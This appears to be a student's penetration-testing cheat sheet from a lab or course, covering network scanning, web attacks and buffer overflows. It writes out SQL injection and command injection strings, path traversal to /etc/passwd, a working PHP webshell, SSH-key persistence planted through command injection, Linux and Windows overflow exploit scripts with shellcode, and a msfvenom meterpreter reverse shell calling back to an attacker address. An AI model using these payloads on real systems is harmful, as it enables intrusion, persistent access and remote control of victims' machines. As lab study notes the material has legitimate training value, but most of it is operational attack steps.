#############################################
              ROT13 and BASE64
#############################################
Methodology:
  step 1: always have notes open (draw.io)
###################    
Host Discovery
###################
    for i in {1..254} ;do (ping -c 1 192.168.28.$i | grep "bytes from" &) ;done
    from the closest machine to the network
    compare results to off limits
    
###################    
Port Discovery
###################
    (setup dynamic tunnel to the furthest ip)
    sudo nmap -Pn -sT -T4 <ip> -p80,22,4444,2222,4242,9999,3389,8080
    sudo proxychains nmap -Pn -sT -T4 <ip> -p80,22,4444,2222,4242,9999,3389,8080
      windows if 445 or 3389
###################
Port Interrogation
###################
    nc <ip> <port>
 
###################
Web Stuff:
###################
    nikto -h <ip>
    nmap -St -T4 <ip> -p80 --script http-enum.nse   #money
    nmap -St -T4 <ip> -p80 --script discovery
    
    login page (USERNAMES/PASSWORDS, GOLDEN STATEMENT DOES NOT WORK):
      ' OR 1='1
      if no useful information try a get request
      f12 network tab
        find POST request
        go to request tab, click raw
        ? after the php in the url and paste the raw url from the request tab

    file read page:
      ; whoami            #if nothing command injection doesnt work :(
      /../../../../../../../../../../../../etc/passwd
      
    Selection Page: ;#
      Identify vulnerable field, try every field
      Union SELECT 1,2,3<,4,5,6...>
        show what positions in the union statement will be displayed where on the table
      UNION SELECT table_schema,table_name,column_name FROM information_schema.columns; #      #GOAT
        Figures out what column are in what table
      UNION SELECT 1,2,@@version
        Displays version #
        
    File Upload:
      webshell:
          <HTML><BODY>
          <FORM METHOD="GET" NAME="myform" ACTION="">
          <INPUT TYPE="text" NAME="cmd">
          <INPUT TYPE="submit" VALUE="Send">
          </FORM>
          <pre>
          <?php
          if($_GET['cmd']) {
            system($_GET['cmd']);
            }
          ?>
          </pre>
          </BODY></HTML>
        
      ssh key upload
      www-data
      ssh-keygen -t rsa
      cat ~/.ssh/id_rsa.pub #copy
      
      now do a command injection on the web server to make ssh directory:
          ; mkdir /var/www/.ssh   #or user key
          ; echo "<full key>" >> /var/www/.ssh/authorized_keys
          ; cat /var/www/.ssh/authorized_keyss
    
    
    
###################
Buffer Overflow:
###################
    Methodology:
    <program> = func
    >gdb program
    >disass main         - disassemble main function
       find more functions and disassemble those
    >run                 - runs the program
      input alot of characters to overflow
          Starting program: /home/student/func 
          Enter a string: 
          AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
          Program received signal SIGSEGV, Segmentation fault.

    in a script:
    https://wiremask.eu/tools/buffer-overflow-pattern-generator/
    ####################################################################################################333
    buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"

    eip = "BBBB"

    nop = '\x90' *  5

    print(buffer + eip + nop)
    ######################################################################################################

    >gdb program
    >run <<< $(python3 lin_buff.py)

    grab the EIP Register value: EIP: 0x31634130 ('0Ac1')     #0x31634130
    put it into wiremask; gives you the offset/length of the buffer you need to overflow
    change the buffer in the script to "A" * <offset size>
    ###########################################################################################################
    #buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
    buffer = "A" * 62
    ###########################################################################################################
    run
    EIP should be 0x42424242 ('BBBB')

    >env - gdb func
    >show env
    >unset env LINES
    >unset env COLUMNS
    >run     #not from gdb peda
    over flow again
    >info proc map
    get the mem address from the first after heap to the last one in the stack
    >find /b 0xf7de1000(first) , 0xffffe000(last), 0xff, 0xe4
    copy 6 of the addresses

    modify script
    ############################################################
    #eip = "BBBB"
    eip = "\xfb\x45\xf6\xf7"      #one of the address but reverse the pairs
    #0xf7de3b59
    #0xf7f588ab
    #0xf7f645fb
    #0xf7f6460f
    #0xf7f64aeb
    #0xf7f64aff
    ############################################################

    >msfconsole
    >use payload/linux/x86/exec
    >show options
    >set CMD whoami
    >generate -b "\x00" -f python
    
    

    modify script:
    #############################################################
    #eip = "BBBB"
    eip = "\xfb\x45\xf6\xf7"
    #0xf7de3b59
    #0xf7f588ab
    #0xf7f645fb
    #0xf7f6460f
    #0xf7f64aeb
    #0xf7f64aff

    buf =  b""
    buf += b"\xbb\xd2\x2c\x29\x54\xdb\xca\xd9\x74\x24\xf4\x5a"
    buf += b"\x2b\xc9\xb1\x0b\x83\xc2\x04\x31\x5a\x10\x03\x5a"
    buf += b"\x10\x30\xd9\x43\x5f\xec\xbb\xc6\x39\x64\x91\x85"
    buf += b"\x4c\x93\x81\x66\x3c\x33\x52\x11\xed\xa1\x3b\x8f"
    buf += b"\x78\xc6\xee\xa7\x7c\x08\x0f\x38\xf4\x60\x60\x59"
    buf += b"\x97\x19\x7e\xce\x34\x50\x9f\x3d\x3a"

    nop = '\x90' *  5

    print(buffer + eip + nop + buf)
    #############################################################

    run the exploit:
    >sudo ./func <<< $(python lin_buff.py)


    TROUBLESHOOTING:
     nop sled to * 10
     regenerate shell code(X3)
     change the jump esp

    
    
    ##############################win_buf.py#######################################
    import socket

    buf = "TRUN /.:/"
    buf += "A" * 5000

    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("10.50.34.144", 9999))
    print s.recv(1024)
    s.send(buf)
    print s.recv(1024)
    s.close()
    #################################################################################

    change buf to a 5000 char string from wiremask
    from immunity debugger: find the EIP value
    find offsetset from wiremask

    #################################################################################
    buf += "A" * 2003
    #################################################################################

    in the search bar for immunity debugger
    !monna jmp -r esp -m "essfunc.dll"
    view, log (find the log window)
    under results copy a jump esp address value

    #################################################################################
    buf += "\xA0\x12\x50\x62"
    buf += "\x90" * 10
    #625012A0 (his value and the reverse value above will be the jump esp value copied)
    #################################################################################

    msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.23.0 lport=4444 -b "\x00" -f python
    copy payload to script after NOP sled line192.168.28.179
    DO NOT COPY: buf = b""

    msfconsole
    use multi/handler
    set payload windows/meterpreter/reverse_tcp
    set LHOST 10.50.23.0

    run server
    run script
    run multi/handler  

  
###################  
POST EXPLOITATION
###################
  bash or /bin/bash if not already
  whoami
  hostname
  which gdb
  sudo -l                                           #GTFO
  find / -type f -perm /4000 2>/dev/null            #GTFO
  find / -type f -perm /2000 2>/dev/null            #GTFO
  find / -type f -perm /6000 2>/dev/null            #GTFO
  which gdb                       #if a box has gdb you will be doing a buffer overflow :(
  cat /etc/hosts
  cat /etc/crontab
  ls /etc/cron.d
  ls /var/tmp
  ls /tmp









